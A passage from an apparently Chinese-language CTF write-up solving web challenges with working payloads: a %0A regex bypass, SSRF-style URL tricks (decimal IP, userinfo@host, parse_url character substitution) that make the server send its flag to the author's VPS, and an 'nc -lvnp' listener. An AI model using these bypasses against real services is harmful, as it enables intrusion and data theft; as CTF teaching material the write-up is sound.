coding:utf-8</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">'''15th_HackingCamp'''</span></span><br><span class="line">dit = []</span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">dit.append((ord(i)+<span class="number">256</span>))</span><br><span class="line"><span class="comment">#print dit </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> dit:</span><br><span class="line">payload += (<span class="string">'value[]='</span>+str(j)+<span class="string">'&amp;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> payload+<span class="string">'password=simple_passw0rd'</span></span><br></pre></td></tr></table></figure><p>得到payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?value[]=305&amp;value[]=309&amp;value[]=372&amp;value[]=360&amp;value[]=351&amp;value[]=328&amp;value[]=353&amp;value[]=355&amp;value[]=363&amp;value[]=361&amp;value[]=366&amp;value[]=359&amp;value[]=323&amp;value[]=353&amp;value[]=365&amp;value[]=368&amp;password=simple_passw0rd</span><br></pre></td></tr></table></figure><p>最后得到flag</p><h3 id="Replace-filter"><a href="#Replace-filter" class="headerlink" title="Replace filter"></a>Replace filter</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'say'</span>]) &amp;&amp; strlen($_GET[<span class="string">'say'</span>]) &lt; <span class="number">20</span>)&#123;</span><br><span class="line"></span><br><span class="line">        $say = preg_replace(<span class="string">'/^(.*)flag(.*)$/'</span>, <span class="string">'$&#123;1&#125;&lt;!-- filtered --&gt;$&#123;2&#125;'</span>, $_GET[<span class="string">'say'</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/give_me_the_flag/'</span>, $say))&#123;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'What the f**k?'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这题题目漏洞出现在正则匹配那里<br>根据我们查到的资料，因为以’^’开头，以’$’结尾的只能匹配一行，也就是说我们可以用<code>%0a</code>/url编码下的换行/去绕过<br>于是我们可以构造payload:?say=<code>%0Agive_me_the_flag</code><br>得到flag</p><h3 id="Give-me-a-link-2"><a href="#Give-me-a-link-2" class="headerlink" title="Give me a link 2"></a>Give me a link 2</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">        $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/_|\s|\0/'</span>, $url))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed character'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $parse = parse_url($url);</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^https?$/i'</span>, $parse[<span class="string">'scheme'</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed scheme'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^(localhost|127\.\d+\.\d+\.\d+|[^.]+)(\:\d+)?$/i'</span>, $parse[<span class="string">'host'</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed host'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/\/plz_give_me$/'</span>, $parse[<span class="string">'path'</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed path'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);</span><br><span class="line">        <span class="keyword">if</span>($socket === <span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Failed to create socket'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $host = gethostbyname($parse[<span class="string">'host'</span>]);</span><br><span class="line">        $port = is_null($parse[<span class="string">'port'</span>]) ? <span class="number">80</span> : $parse[<span class="string">'port'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(socket_connect($socket, $host, $port) === <span class="keyword">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Failed to connect'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $send = <span class="string">"HEAD /"</span>.$flag.<span class="string">" HTTP/1.1\r\n"</span>.</span><br><span class="line">            <span class="string">"Host: "</span>.$host.<span class="string">":"</span>.$port.<span class="string">"\r\n"</span>.</span><br><span class="line">            <span class="string">"Connection: Close\r\n"</span>.</span><br><span class="line">            <span class="string">"\r\n\r\n"</span>;</span><br><span class="line">        socket_write($socket, $send, strlen($send));</span><br><span class="line"></span><br><span class="line">        $recv = socket_read($socket, <span class="number">1024</span>);var_dump($recv);</span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^HTTP\/1.1 200 OK\r\n/'</span>, $recv))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed response'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        socket_close($socket);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Okay, I sent the flag.'</span>, <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>跟上面一题类似，只是对于host有了过滤，这里我们用 <code>ip2long()</code> 函数将网络地址转化为数字地址，这样就可以绕过.的ip过滤<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> ip2long(<span class="string">"120.78.164.84"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>Payload ：<br><code>givemealink2.solveme.peng.kr?url=http://2018419796:8080/plz%1agive%1ame</code><br>然后在服务器上面开监听</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 8080</span><br></pre></td></tr></table></figure><p>就可以接收到返回的flag</p><h3 id="Give-me-a-link"><a href="#Give-me-a-link" class="headerlink" title="Give me a link"></a>Give me a link</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">require</span> <span class="keyword">__DIR__</span>.<span class="string">'/lib.php'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">        $url = $_GET[<span class="string">'url'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/_|\s|\0/'</span>, $url))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed character'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!preg_match(<span class="string">'/^https?\:\/\/'</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].<span class="string">'/i'</span>, $url))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed URL'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $parse = parse_url($url);</span><br><span class="line">        <span class="keyword">if</span>($parse[<span class="string">'path'</span>] !== <span class="string">'/plz_give_me'</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'Not allowed path'</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $ch = curl_init();</span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $parse[<span class="string">'scheme'</span>].<span class="string">'://'</span>.$parse[<span class="string">'host'</span>].<span class="string">'/'</span>.$flag);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="keyword">true</span>);</span><br><span class="line">        curl_exec($ch);</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Okay, I sent the flag.'</span>, <span class="string">'&lt;hr&gt;'</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>这里发现这段代码的逻辑是用get方法接受一个参数url，而这个参数要经过三次的检测，第一次会把含有下划线，空白字符过滤掉，第二次过滤检验的是是否满足url的格式，而且必须含有<code>$_SERVER[&#39;HTTP_HOST&#39;]</code>里面的内容也就是<code>http://givemealink.solveme.peng.kr/</code>，而第三次则判断路径下是否含有<code>plz_give_me</code>这个字段，突然发现这个东西跟第一个过滤下划线的自相矛盾，查一下PHP文档，问题出现在parse_url这个函数里</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url</span><br><span class="line"></span><br><span class="line">    The URL to parse. Invalid characters are replaced by _.</span><br></pre></td></tr></table></figure><p>非法字符在这个函数下会自动替换成下划线，测试一下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   $url = urldecode(<span class="string">"http://0verwatch.top/%1atest%1a.php"</span>);</span><br><span class="line">   var_dump(parse_url($url));</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">3</span>) &#123;</span><br><span class="line">  [<span class="string">"scheme"</span>]=&gt;</span><br><span class="line">  string(<span class="number">4</span>) <span class="string">"http"</span></span><br><span class="line">  [<span class="string">"host"</span>]=&gt;</span><br><span class="line">  string(<span class="number">13</span>) <span class="string">"0verwatch.top"</span></span><br><span class="line">  [<span class="string">"path"</span>]=&gt;</span><br><span class="line">  string(<span class="number">11</span>) <span class="string">"/_test_.php"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>发现这时候就可以利用这一点成功绕过第一个过滤，以及满足第三个过滤<br>这时候考虑第二个过滤，继续查看parse_url这个函数文档你会发现他有这样一个例子，<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="string">'http://username:password@hostname:9090/path?arg=value#anchor'</span>;</span><br><span class="line"></span><br><span class="line">var_dump(parse_url($url));</span><br></pre></td></tr></table></figure></p><p>这也是url的一种写法，现在感觉很少用在http服务上感觉在ssh连接自己的服务器上面用的多，因为一般的url都是这样的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">protocol :// hostname[:port] / path / [;parameters][?query]#fragment</span><br></pre></td></tr></table></figure></p><p>但是平常我们连接自己服务器的时候可以这样<code>ssh root@vps_ip</code> 然后输入密码，这应该也是这种类型的<br><a href="https://imgchr.com/i/P28fJO" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/14/P28fJO.md.png" alt="P28fJO.md.png"></a></p><p>然后这里的话相当于username还有password没有任何实际作用，纯粹就是用来写那个$_SERVER[‘HTTP_HOST’]来进行绕过的<br>payload：<code>http://givemealink.solveme.peng.kr?url=givemealink.solveme.peng.kr@vps_ip/plz%1agive%1ame</code><br>我们再测试一下，结果完全符合我们绕过的要求<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">4</span>) &#123;</span><br><span class="line">  [<span class="string">"scheme"</span>]=&gt;</span><br><span class="line">  string(<span class="number">4</span>) <span class="string">"http"</span></span><br><span class="line">  [<span class="string">"host"</span>]=&gt;</span><br><span class="line">  string(<span class="number">13</span>) <span class="string">"120.78.164.84"</span></span><br><span class="line">  [<span class="string">"user"</span>]=&gt;</span><br><span class="line">  string(<span class="number">59</span>) <span class="string">"givemealink.solveme.peng.kr?url=givemealink.solveme.peng.kr"</span></span><br><span class="line">  [<span class="string">"path"</span>]=&gt;</span><br><span class="line">  string(<span class="number">12</span>) <span class="string">"/plz_give_me"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>然后就利用那一个<code>curl_setopt</code>函数往我们这边服务器发送flag了，vps这边监听80端口,出现flag</p><h3 id="Hell-JS"><a href="#Hell-JS" class="headerlink" title="Hell JS"></a>Hell JS</h3><p>点开发现存在一大堆Js混淆代码，解码一看发现有一堆数字很可疑<br><a href="https://imgchr.com/i/P28IQH" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/14/P28IQH.md.png" alt="P28IQH.md.png"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;4&quot;+&quot;7&quot;,&quot;4&quot;+&quot;7&quot;,&quot;3&quot;+&quot;2&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;111&quot;,&quot;111&quot;,&quot;100&quot;,&quot;3&quot;+&quot;2&quot;,&quot;106&quot;,&quot;111&quot;,&quot;98&quot;,&quot;3&quot;+&quot;3&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;108&quot;,&quot;101&quot;,&quot;116&quot;,&quot;3&quot;+&quot;2&quot;,&quot;102&quot;,&quot;108&quot;,&quot;97&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;3&quot;+&quot;2&quot;,&quot;61&quot;,&quot;3&quot;+&quot;2&quot;,&quot;112&quot;,&quot;1&quot;+&quot;1&quot;+&quot;4&quot;,&quot;111&quot;,&quot;1&quot;+&quot;0&quot;+&quot;9&quot;,&quot;112&quot;,&quot;116&quot;,&quot;40&quot;,&quot;34&quot;,&quot;119&quot;,&quot;1&quot;+&quot;0&quot;+&quot;4&quot;,&quot;97&quot;,&quot;116&quot;,&quot;3&quot;+&quot;2&quot;,&quot;105&quot;,&quot;1&quot;+&quot;1&quot;+&quot;5&quot;,&quot;3&quot;+&quot;2&quot;,&quot;116&quot;,&quot;1&quot;+&quot;0&quot;+&quot;4&quot;,&quot;101&quot;,&quot;3&quot;+&quot;2&quot;,&quot;102&quot;,&quot;108&quot;,&quot;97&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;6&quot;+&quot;3&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;5&quot;+&quot;9&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;105&quot;,&quot;102&quot;,&quot;3&quot;+&quot;2&quot;,&quot;40&quot;,&quot;102&quot;,&quot;108&quot;,&quot;97&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;3&quot;+&quot;2&quot;,&quot;61&quot;,&quot;61&quot;,&quot;61&quot;,&quot;3&quot;+&quot;2&quot;,&quot;34&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;3&quot;+&quot;2&quot;,&quot;1&quot;+&quot;2&quot;+&quot;3&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;9&quot;,&quot;97&quot;,&quot;108&quot;,&quot;101&quot;,&quot;1&quot;+&quot;1&quot;+&quot;4&quot;,&quot;116&quot;,&quot;40&quot;,&quot;34&quot;,&quot;112&quot;,&quot;108&quot;,&quot;110&quot;,&quot;112&quot;,&quot;1&quot;+&quot;1&quot;+&quot;7&quot;,&quot;116&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;5&quot;+&quot;9&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;125&quot;,&quot;3&quot;+&quot;2&quot;,&quot;101&quot;,&quot;108&quot;,&quot;1&quot;+&quot;1&quot;+&quot;5&quot;,&quot;101&quot;,&quot;3&quot;+&quot;2&quot;,&quot;105&quot;,&quot;102&quot;,&quot;3&quot;+&quot;2&quot;,&quot;40&quot;,&quot;102&quot;,&quot;108&quot;,&quot;97&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;3&quot;+&quot;2&quot;,&quot;61&quot;,&quot;61&quot;,&quot;61&quot;,&quot;3&quot;+&quot;2&quot;,&quot;34&quot;,&quot;102&quot;,&quot;108&quot;,&quot;97&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;1&quot;+&quot;2&quot;+&quot;3&quot;,&quot;5&quot;+&quot;0&quot;,&quot;4&quot;+&quot;9&quot;,&quot;100&quot;,&quot;102&quot;,&quot;5&quot;+&quot;2&quot;,&quot;97&quot;,&quot;100&quot;,&quot;5&quot;+&quot;1&quot;,&quot;99&quot;,&quot;101&quot;,&quot;5&quot;+&quot;1&quot;,&quot;4&quot;+&quot;9&quot;,&quot;97&quot;,&quot;102&quot;,&quot;5&quot;+&quot;6&quot;,&quot;5&quot;+&quot;2&quot;,&quot;5&quot;+&quot;3&quot;,&quot;99&quot;,&quot;102&quot;,&quot;57&quot;,&quot;99&quot;,&quot;100&quot;,&quot;5&quot;+&quot;4&quot;,&quot;97&quot;,&quot;5&quot;+&quot;3&quot;,&quot;101&quot;,&quot;100&quot;,&quot;100&quot;,&quot;98&quot;,&quot;98&quot;,&quot;57&quot;,&quot;4&quot;+&quot;9&quot;,&quot;125&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;3&quot;+&quot;2&quot;,&quot;1&quot;+&quot;2&quot;+&quot;3&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;9&quot;,&quot;97&quot;,&quot;108&quot;,&quot;101&quot;,&quot;1&quot;+&quot;1&quot;+&quot;4&quot;,&quot;116&quot;,&quot;40&quot;,&quot;34&quot;,&quot;98&quot;,&quot;105&quot;,&quot;1&quot;+&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;111&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;5&quot;+&quot;9&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;125&quot;,&quot;3&quot;+&quot;2&quot;,&quot;101&quot;,&quot;108&quot;,&quot;1&quot;+&quot;1&quot;+&quot;5&quot;,&quot;101&quot;,&quot;3&quot;+&quot;2&quot;,&quot;1&quot;+&quot;2&quot;+&quot;3&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;9&quot;,&quot;97&quot;,&quot;108&quot;,&quot;101&quot;,&quot;1&quot;+&quot;1&quot;+&quot;4&quot;,&quot;116&quot;,&quot;40&quot;,&quot;34&quot;,&quot;119&quot;,&quot;1&quot;+&quot;1&quot;+&quot;4&quot;,&quot;111&quot;,&quot;1&quot;+&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;+&quot;3&quot;,&quot;34&quot;,&quot;4&quot;+&quot;1&quot;,&quot;5&quot;+&quot;9&quot;,&quot;1&quot;+&quot;0&quot;,&quot;1&quot;+&quot;0&quot;,&quot;125&quot;</span><br></pre></td></tr></table></figure></p><p>写个小脚本解一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dit = [<span class="string">"4"</span>+<span class="string">"7"</span>,<span class="string">"4"</span>+<span class="string">"7"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"111"</span>,<span class="string">"111"</span>,<span class="string">"100"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"106"</span>,<span class="string">"111"</span>,<span class="string">"98"</span>,<span class="string">"3"</span>+<span class="string">"3"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"108"</span>,<span class="string">"101"</span>,<span class="string">"116"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"102"</span>,<span class="string">"108"</span>,<span class="string">"97"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"61"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"112"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"4"</span>,<span class="string">"111"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"9"</span>,<span class="string">"112"</span>,<span class="string">"116"</span>,<span class="string">"40"</span>,<span class="string">"34"</span>,<span class="string">"119"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"4"</span>,<span class="string">"97"</span>,<span class="string">"116"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"105"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"5"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"116"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"4"</span>,<span class="string">"101"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"102"</span>,<span class="string">"108"</span>,<span class="string">"97"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"6"</span>+<span class="string">"3"</span>,<span class="string">"34"</span>,<span class="string">"4"</span>+<span class="string">"1"</span>,<span class="string">"5"</span>+<span class="string">"9"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"105"</span>,<span class="string">"102"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"40"</span>,<span class="string">"102"</span>,<span class="string">"108"</span>,<span class="string">"97"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"61"</span>,<span class="string">"61"</span>,<span class="string">"61"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"34"</span>,<span class="string">"34"</span>,<span class="string">"4"</span>+<span class="string">"1"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"1"</span>+<span class="string">"2"</span>+<span class="string">"3"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"9"</span>,<span class="string">"97"</span>,<span class="string">"108"</span>,<span class="string">"101"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"4"</span>,<span class="string">"116"</span>,<span class="string">"40"</span>,<span class="string">"34"</span>,<span class="string">"112"</span>,<span class="string">"108"</span>,<span class="string">"110"</span>,<span class="string">"112"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"7"</span>,<span class="string">"116"</span>,<span class="string">"34"</span>,<span class="string">"4"</span>+<span class="string">"1"</span>,<span class="string">"5"</span>+<span class="string">"9"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>,<span class="string">"125"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"101"</span>,<span class="string">"108"</span>,<span class="string">"1"</span>+<span class="string">"1"</span>+<span class="string">"5"</span>,<span class="string">"101"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"105"</span>,<span class="string">"102"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"40"</span>,<span class="string">"102"</span>,<span class="string">"108"</span>,<span class="string">"97"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"61"</span>,<span class="string">"61"</span>,<span class="string">"61"</span>,<span class="string">"3"</span>+<span class="string">"2"</span>,<span class="string">"34"</span>,<span class="string">"102"</span>,<span class="string">"108"</span>,<span class="string">"97"</span>,<span class="string">"1"</span>+<span class="string">"0"</span>+<span class="string">"3"</span>,<span class="string">"1"</span>+<span class="string">"2"</span>+<span class="string">"3"</span>,<span class="string">"5"</span>+<span class="string">"0"</span>,<span class="string">"4"</span>+<span class="string">"9"</span>,<span class="string">"100"</span>,<span class="string">"102"</span>,<span class="string">"5"</span>+<span class="string">"2"</span>,<span class="string">"97"</span>,<span class="string">"100"</span>,<span class="string">"5"</span>+<span class="string">"1"</span>,<span class="string">"99"</span>,<span class="string">"101"</span>,<span class="string">"5"</span>+<span class="string">"1"</span>,<span class="string">"4"</span>+<span class="string">"9"</span>,<span class="string">"97"</span>,<span class="string">"102"</span>,<span class="string">"5"</span>+<span class="string">"6"</span>,<span class="string">"5"</span>+<span class="string">"2"</span>,<span class="string">"5"</span>+<span class="string">"3"</span>,<span class="string">"99"</span>,<span class="string">"102"</span>,<span class="string">"57"</span>,<span class="string">"99"</span>,<span class="string">"100"</span>,<span class="string">"5"</span>+<span class="string">"4"</span>,<span class="string">"97"</span>,<span class="string">"5"</span>+<span class="string">"3"</span>,<span class="string">"101"</span>,<span class="string">"100"</span>,<span class="string">"100"</span>,<span class="string">"98"</span>,<span class="string">"98"</span>,<span class="string">"57"</span>,<span class="string">"4"</span>+<span class="string">"9"</span>,<span 